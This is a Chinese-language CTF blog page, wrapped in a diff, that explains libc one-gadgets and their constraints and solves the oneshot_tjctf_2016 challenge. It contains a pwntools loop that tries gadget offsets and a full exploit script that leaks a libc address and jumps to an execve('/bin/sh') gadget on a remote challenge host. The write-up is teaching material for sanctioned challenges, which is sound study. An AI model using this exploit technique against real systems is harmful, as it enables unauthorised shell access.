@@ -1,0 +1,550 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    One-gadgets | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="One-gadgetsOne-gadget 是 libc 中存在的一些执行 execve(‘&#x2F;bin&#x2F;sh’, NULL, NULL)的片段。当我们知道 libc 的版本，并且通过信息泄露得到 libc 的基址，就可以通过控制 EIP&#x2F;RIP(覆盖.got.plt 或者函数返回地址等)执行该 gadgets 达到远程代码的执行目的，获取 shell。 下载 one_g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="One-gadgets">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/One-gadgets/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="One-gadgetsOne-gadget 是 libc 中存在的一些执行 execve(‘&#x2F;bin&#x2F;sh’, NULL, NULL)的片段。当我们知道 libc 的版本，并且通过信息泄露得到 libc 的基址，就可以通过控制 EIP&#x2F;RIP(覆盖.got.plt 或者函数返回地址等)执行该 gadgets 达到远程代码的执行目的，获取 shell。 下载 one_g">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/jueMkGHiEWXvZ9Jv/1774014047956-2bbc6b4c-4a20-4fff-9fce-c34997841568-908291.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/jueMkGHiEWXvZ9Jv/1774013372164-e9d86518-5e8e-47ef-8ffc-8469a8e794b8-154169.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/jueMkGHiEWXvZ9Jv/1774013670699-7aee4c28-7ea4-4ac8-b814-83a2c3d1e0ca-032518.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/jueMkGHiEWXvZ9Jv/1774014104331-63dd7eff-5b19-4772-97ac-18ad4e61077d-941829.png">
+<meta property="article:published_time" content="2026-04-28T10:25:56.920Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.378Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/jueMkGHiEWXvZ9Jv/1774014047956-2bbc6b4c-4a20-4fff-9fce-c34997841568-908291.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="One-gadgets">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">One-gadgets</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#One-gadgets"><span class="toc-number">1.</span> <span class="toc-text">One-gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD-one-gadgets"><span class="toc-number">1.1.</span> <span class="toc-text">下载 one_gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-gadgets-%E7%9A%84%E7%BA%A6%E6%9D%9F%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">One_gadgets 的约束：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BC%98%E5%85%88%E9%80%89%E6%8B%A9%E2%80%9C%E7%BA%A6%E6%9D%9F%E6%9C%80%E5%BC%B1%E2%80%9D%E7%9A%84-Gadget"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 优先选择“约束最弱”的 Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%A7%82%E5%AF%9F%E5%BD%93%E5%89%8D%E7%9A%84%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 观察当前的执行上下文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8A%A8%E6%80%81%E8%B0%83%E6%95%B4%E7%8E%AF%E5%A2%83%E4%BB%A5%E6%BB%A1%E8%B6%B3%E7%BA%A6%E6%9D%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 动态调整环境以满足约束</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E6%89%80%E6%9C%89-Gadget-%E9%83%BD%E5%A4%B1%E8%B4%A5%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">4. 常见问题：为什么所有 Gadget 都失败？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">总结建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oneshot-tjctf-2016"><span class="toc-number">1.5.</span> <span class="toc-text">oneshot_tjctf_2016</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/One-gadgets" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:56.920Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="One-gadgets"><a href="#One-gadgets" class="headerlink" title="One-gadgets"></a>One-gadgets</h1><p>One-gadget 是 libc 中存在的一些执行 execve(‘&#x2F;bin&#x2F;sh’, NULL, NULL)的片段。当我们知道 libc 的版本，并且通过信息泄露得到 libc 的基址，就可以通过控制 EIP&#x2F;RIP(覆盖.got.plt 或者函数返回地址等)执行该 gadgets 达到远程代码的执行目的，获取 shell。</p>
+<h3 id="下载-one-gadgets"><a href="#下载-one-gadgets" class="headerlink" title="下载 one_gadgets"></a>下载 one_gadgets</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/jueMkGHiEWXvZ9Jv/1774014047956-2bbc6b4c-4a20-4fff-9fce-c34997841568-908291.png" alt="1774014047956-2bbc6b4c-4a20-4fff-9fce-c34997841568.png"></p>
+<h3 id="One-gadgets-的约束："><a href="#One-gadgets-的约束：" class="headerlink" title="One_gadgets 的约束："></a>One_gadgets 的约束：</h3><p>在二进制漏洞利用（Pwn）中，选择 <code>one_gadget</code> 的核心在于<strong>匹配约束条件（Constraints）</strong>。</p>
+<p>当你运行 <code>one_gadget /lib/x86_64-linux-gnu/libc.so.6</code> 时，它会输出多个候选地址，每个地址下方都列出了执行该 gadget 必须满足的寄存器或内存状态。</p>
+<p>以下是选定和调试 <code>one_gadget</code> 的实战步骤：</p>
+<h4 id="1-优先选择“约束最弱”的-Gadget"><a href="#1-优先选择“约束最弱”的-Gadget" class="headerlink" title="1. 优先选择“约束最弱”的 Gadget"></a>1. 优先选择“约束最弱”的 Gadget</h4><p>通常输出中会排列出多个 gadget，有的约束非常复杂（需要多个寄存器为 NULL），有的则相对简单。</p>
+<ul>
+<li>首选只要求 <code>[rsp+0x30] == NULL</code> 或 <code>rax == NULL</code> 这种容易控制的。</li>
+<li>避开需要 <code>[[rbp-0x78]] == NULL</code> 这种涉及多级指针或远程内存地址的，除非你已经完全控制了相关区域</li>
+</ul>
+<h4 id="2-观察当前的执行上下文"><a href="#2-观察当前的执行上下文" class="headerlink" title="2. 观察当前的执行上下文"></a>2. 观察当前的执行上下文</h4><p>在调试器（如 GDB + GEF&#x2F;pwndbg）中，当程序运行到你准备跳转到 <code>one_gadget</code> 的那一刻（例如 <code>malloc_hook</code> 或返回地址被覆盖时），停下来检查：</p>
+<ul>
+<li><strong>寄存器状态：</strong> 输入 <code>info registers</code>。看看 rax, rbx, rcx 等是否已经是 NULL。</li>
+<li><strong>栈状态：</strong> 输入 stack 20 或 x&#x2F;20gx $rsp。看看栈上的特定偏移（如 <code>rsp+0x40</code>）是否已经是 0。</li>
+<li><strong>匹配：</strong> 找一个约束条件与当前状态最接近的 gadget。</li>
+</ul>
+<h4 id="3-动态调整环境以满足约束"><a href="#3-动态调整环境以满足约束" class="headerlink" title="3. 动态调整环境以满足约束"></a>3. 动态调整环境以满足约束</h4><p>如果你心仪的某个 gadget 只需要 <code>rax == NULL</code>，但此时 <code>rax</code> 有值，你可以尝试：</p>
+<ul>
+<li><strong>寻找前置 Gadget：</strong> 在跳转到 <code>one_gadget</code> 之前，先跳到一个能清空寄存器的代码片段（如 <code>xor rax, rax; ret</code>）。</li>
+<li><strong>利用栈溢出填充：</strong> 如果约束是 <code>[rsp+0x70] == NULL</code>，而你通过栈溢出控制了程序流，可以直接在溢出数据中将对应的偏移位置填为 <code>\x00</code>。</li>
+</ul>
+<h3 id="4-常见问题：为什么所有-Gadget-都失败？"><a href="#4-常见问题：为什么所有-Gadget-都失败？" class="headerlink" title="4. 常见问题：为什么所有 Gadget 都失败？"></a>4. 常见问题：为什么所有 Gadget 都失败？</h3><p>如果尝试了所有的 <code>one_gadget</code> 都无法直接拿 shell，通常有几种对策：</p>
+<ul>
+<li><strong>使用 -f 参数：</strong> 运行 <code>one_gadget -f libc.so.6</code> 强制搜索更多不常用的 gadget（成功率较低，但值得一试）。</li>
+<li><strong>使用 -near 参数：</strong> 如果你知道某个特定的 libc 地址，可以用 <code>one_gadget --near [address] libc.so.6</code> 寻找附近的 gadget。</li>
+<li><strong>回退到常规 <strong><code><strong>system(&quot;/bin/sh&quot;)</strong></code></strong>：</strong> 如果 <code>one_gadget</code> 实在难以满足约束，还是建议老老实实通过 ROP 链构造参数并调用 <code>system</code> 或 <code>execve</code>。</li>
+</ul>
+<h3 id="总结建议"><a href="#总结建议" class="headerlink" title="总结建议"></a>总结建议</h3><p>在 CTF 比赛中，最快的办法是挨个试。写一个 Python 脚本，用 <code>pwntools</code> 循环遍历 <code>one_gadget</code> 输出的所有偏移量，通常前三个中必有一个能用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>] <span class="comment"># one_gadget </span></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> one_gadgets:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">    payload = padding + p64(libc_base + addr)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>给个例题演示一下吧：</p>
+<h3 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h3><p><img src="/HFTTC.github.io/./img/jueMkGHiEWXvZ9Jv/1774013372164-e9d86518-5e8e-47ef-8ffc-8469a8e794b8-154169.png" alt="1774013372164-e9d86518-5e8e-47ef-8ffc-8469a8e794b8.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 (*v4)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Read location?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value: 0x%016lx\n&quot;</span>, *(_QWORD *)v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Jump location?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/jueMkGHiEWXvZ9Jv/1774013670699-7aee4c28-7ea4-4ac8-b814-83a2c3d1e0ca-032518.png" alt="1774013670699-7aee4c28-7ea4-4ac8-b814-83a2c3d1e0ca.png"></p>
+<p>直接用 0x45216 的 execve(“&#x2F;bin&#x2F;sh”)</p>
+<p><img src="/HFTTC.github.io/./img/jueMkGHiEWXvZ9Jv/1774014104331-63dd7eff-5b19-4772-97ac-18ad4e61077d-941829.png" alt="1774014104331-63dd7eff-5b19-4772-97ac-18ad4e61077d.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28491</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./oneshot&quot;</span>)</span><br><span class="line"> </span><br><span class="line">rdi = <span class="number">0x400743</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;Read location?&quot;</span>)</span><br><span class="line">p.sendline(str(puts_got))</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line"><span class="built_in">puts</span> = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">print(hex(<span class="built_in">puts</span>))</span><br><span class="line"> </span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">base = <span class="built_in">puts</span> - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x45216</span> + base</span><br><span class="line">p.sendline(str(one_gadget))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag{51ab8ff5-809d-4741-bc28-da695868b60a}</p>
+<blockquote>
+<p>更新: 2026-04-24 20:41:32<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/giguc4w8v844bgek">https://www.yuque.com/idcm/wnemg9/giguc4w8v844bgek</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/progress/" aria-label="前一篇: no title" title="前一篇: no title"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            (no title)
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="MipsPwn" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/MipsPwn/" aria-label="后一篇: MipsPwn"  title="后一篇: MipsPwn"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          MipsPwn
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#One-gadgets"><span class="toc-number">1.</span> <span class="toc-text">One-gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD-one-gadgets"><span class="toc-number">1.1.</span> <span class="toc-text">下载 one_gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-gadgets-%E7%9A%84%E7%BA%A6%E6%9D%9F%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">One_gadgets 的约束：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BC%98%E5%85%88%E9%80%89%E6%8B%A9%E2%80%9C%E7%BA%A6%E6%9D%9F%E6%9C%80%E5%BC%B1%E2%80%9D%E7%9A%84-Gadget"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 优先选择“约束最弱”的 Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%A7%82%E5%AF%9F%E5%BD%93%E5%89%8D%E7%9A%84%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 观察当前的执行上下文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8A%A8%E6%80%81%E8%B0%83%E6%95%B4%E7%8E%AF%E5%A2%83%E4%BB%A5%E6%BB%A1%E8%B6%B3%E7%BA%A6%E6%9D%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 动态调整环境以满足约束</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E6%89%80%E6%9C%89-Gadget-%E9%83%BD%E5%A4%B1%E8%B4%A5%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">4. 常见问题：为什么所有 Gadget 都失败？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">总结建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oneshot-tjctf-2016"><span class="toc-number">1.5.</span> <span class="toc-text">oneshot_tjctf_2016</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
